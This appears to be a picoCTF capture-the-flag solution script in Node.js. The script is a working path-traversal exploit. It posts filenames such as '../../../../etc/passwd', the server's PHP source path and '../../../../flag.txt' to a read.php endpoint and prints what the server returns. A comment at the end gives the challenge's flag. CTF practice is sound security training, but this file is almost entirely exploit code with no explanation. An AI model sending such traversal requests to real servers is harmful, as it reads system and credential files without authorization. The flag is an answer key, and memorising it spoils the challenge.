const axios = require('axios');

const url = 'http://saturn.picoctf.net:52683/read.php';


async function get_file(path) {
  const params = new URLSearchParams({
    filename: path,
  });
  const data = await axios.post(url, params)
    .then((res) => {
      return res.data;
    });
  return data;
}


async function main() {
  const etc_passwd = await get_file('../../../../etc/passwd');
  console.log(etc_passwd);
  const source = await get_file('../../../../usr/share/nginx/html/read.php');
  console.log(source);
  const flag = await get_file('../../../../flag.txt');
  console.log(flag);
}


main().catch((err) => { console.log(err) });


// picoCTF{7h3_p47h_70_5ucc355_e5fe3d4d}
